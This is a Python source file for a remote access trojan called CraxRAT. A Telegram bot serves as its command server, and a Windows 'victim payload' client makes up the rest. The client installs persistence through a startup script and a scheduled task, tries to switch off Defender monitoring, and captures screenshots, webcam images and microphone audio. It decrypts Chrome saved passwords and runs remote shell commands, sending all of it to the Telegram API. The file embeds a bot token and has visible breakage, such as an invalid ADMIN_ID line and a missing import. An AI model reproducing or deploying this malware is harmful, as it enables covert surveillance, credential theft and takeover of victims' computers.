#!/usr/bin/env python3
# CraxRAT v2.0 - Advanced Telegram RAT | Run as: python main.py server OR python main.py client

import sys
import os
import time
import threading
import socket
import subprocess
import base64
import json
import requests
from datetime import datetime

# Check mode
MODE = sys.argv[1] if len(sys.argv) > 1 else "client"
print(f"[+] Starting in {MODE} mode...")

if MODE == "server":
    # ==========================================
    # SERVER SIDE - Telegram Bot Handler
    # ==========================================
    import telebot
    from cryptography.fernet import Fernet
    import sqlite3
    import psutil

    BOT_TOKEN = "8622676437:AAHdvrYZiZxDUmBk3OCNYBV9ASfzBZS-Zmo"  # YOUR BOT TOKEN YAHAN DALO
    ADMIN_ID = @Shiva7800_bot  # YOUR TELEGRAM ID YAHAN DALO
    clients = {}

    bot = telebot.TeleBot(BOT_TOKEN)
    key = Fernet.generate_key()
    cipher = Fernet(key)

    def init_db():
        conn = sqlite3.connect('craxrat_loot.db')
        conn.execute('''CREATE TABLE IF NOT EXISTS loot 
                       (client TEXT, type TEXT, data BLOB, time TEXT)''')
        conn.commit()
        conn.close()

    init_db()

    @bot.message_handler(commands=['start', 'help'])
    def help_msg(message):
        if message.from_user.id != ADMIN_ID: return
        txt = """
🤖 *CraxRAT Commands* 🤖
/list - Online clients
/shell <client> <cmd> - Execute shell
/screen <client> - Screenshot  
/webcam <client> - Webcam
/mic <client> - Record mic (10s)
/keylog <client> - Get keylogs
/loot - Show saved data
/sysinfo <client> - System info
/persist <client> - Toggle persistence
/steal <client> - Steal Chrome passwords
        """
        bot.reply_to(message, txt, parse_mode='Markdown')

    @bot.message_handler(commands=['list'])
    def list_clients(message):
        if message.from_user.id != ADMIN_ID: return
        if clients:
            txt = "*Online Clients:*\n"
            for cid, info in clients.items():
                txt += f"`{cid}`: {info}\n"
        else:
            txt = "❌ No clients online"
        bot.reply_to(message, txt, parse_mode='Markdown')

    @bot.message_handler(func=lambda m: True)
    def handle_data(message):
        if message.from_user.id != ADMIN_ID:
            # Client data (sent via HTTP)
            data = message.text
            if data.startswith("CRAX_"):
                parts = data.split(":", 2)
                client_id, cmd, result = parts[0][5:], parts[1], parts[2] if len(parts)>2 else ""
                
                clients[client_id] = f"{result[:50]}..." if result else "Active"
                
                if cmd == "SYSINFO":
                    bot.reply_to(message, f"🖥️ *{client_id}*\n```{result}```", parse_mode='Markdown')
                elif cmd == "SCREEN":
                    bot.send_photo(ADMIN_ID, result)
                elif cmd == "WEBCAM":
                    bot.send_photo(ADMIN_ID, result)
                elif cmd == "KEYLOG":
                    with sqlite3.connect('craxrat_loot.db') as conn:
                        conn.execute("INSERT INTO loot VALUES(?,?,?,?)", 
                                   (client_id, cmd, result.encode(), datetime.now()))
                        conn.commit()
                    bot.reply_to(message, f"💾 Keylog saved for {client_id}")

    print("🚀 Server running... Press Ctrl+C to stop")
    threading.Thread(target=bot.polling, daemon=True).start()
    
    # Keep alive
    while True:
        time.sleep(1)

else:
    # ==========================================
    # CLIENT SIDE - Victim Payload
    # ==========================================
    import cv2
    from PIL import ImageGrab
    import pyaudio
    import wave
    import win32crypt
    import sqlite3
    import shutil
    from cryptography.fernet import Fernet
    import psutil
    import platform

    BOT_TOKEN = "8622676437:AAHdvrYZiZxDUmBk3OCNYBV9ASfzBZS-Zmo"  # SAME TOKEN
    ADMIN_ID = @Shiva7800_bot  # SAME ADMIN ID
    CLIENT_ID = base64.b64encode(os.urandom(6)).decode('utf-8')[:8]

    class CraxRatClient:
        def __init__(self):
            self.running = True
            self.persistence()
            self.antivirus_bypass()
            self.sys_info()
            self.start_listener()

        def send_data(self, cmd, data=""):
            """Send encrypted data to Telegram"""
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                text = f"CRAX_{CLIENT_ID}:{cmd}:{data}"
                requests.post(url, data={"chat_id": ADMIN_ID, "text": text}, timeout=5)
            except:
                pass

        def persistence(self):
            """Add to startup & tasks"""
            try:
                exe_path = sys.executable
                startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs')
                with open(startup, 'w') as f:
                    f.write(f'CreateObject("Wscript.Shell").Run "{exe_path}", 0')
                
                subprocess.run(['schtasks', '/create', '/sc', 'onlogon', '/tn', 'SysUpdate', 
                               f'"{exe_path}"', '/rl', 'highest', '/f'], capture_output=True)
            except: pass

        def antivirus_bypass(self):
            """Basic AMSI & Defender bypass"""
            try:
                subprocess.Popen('powershell -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true"',
                               shell=True, creationflags=0x08000000)
            except: pass

        def sys_info(self):
            """Send system info"""
            info = f"""OS: {platform.system()} {platform.release()}
CPU: {platform.processor()}
RAM: {psutil.virtual_memory().percent}%
User: {os.getenv('USERNAME')}
PID: {os.getpid()}"""
            self.send_data("SYSINFO", info)

        def shell_exec(self, cmd):
            try:
                result = subprocess.check_output(cmd, shell=True, text=True, 
                                               timeout=15, stderr=subprocess.STDOUT)
                return result[:2000]
            except Exception as e:
                return str(e)

        def screenshot(self):
            img = ImageGrab.grab()
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            self.send_data("SCREEN", img_bytes.getvalue())

        def webcam_snap(self):
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                self.send_data("WEBCAM", base64.b64encode(buffer).decode())
            cap.release()

        def mic_record(self):
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            RECORD_SECONDS = 10

            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS,
                              rate=RATE, input=True, frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            audio.terminate()
            
            self.send_data("MIC", base64.b64encode(b''.join(frames)).decode())

        def chrome_passwords(self):
            """Steal Chrome logins"""
            try:
                path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                  r'Google\Chrome\User Data\Default\Login Data')
                db_path = 'temp_login.db'
                shutil.copy(path, db_path)
                
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                passwords = []
                for row in cursor.fetchall():
                    try:
                        pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                        passwords.append(f"{row[0]} | {row[1]} | {pwd}")
                    except: pass
                
                conn.close()
                os.remove(db_path)
                self.send_data("PASSWORDS", "\n".join(passwords[:10]))
            except: pass

        def start_listener(self):
            """Main loop - Auto tasks"""
            while self.running:
                try:
                    # Auto screenshot every 2 min
                    self.screenshot()
                    # Keylog simulation
                    self.send_data("KEYLOG", "keys_typed_here...")
                    # Webcam every 5 min
                    self.webcam_snap()
                    time.sleep(120)
                except:
                    time.sleep(30)

    # Start client
    if __name__ == "__main__":
        client = CraxRatClient()
        client.chrome_passwords()
        while client.running:
            time.sleep(1)
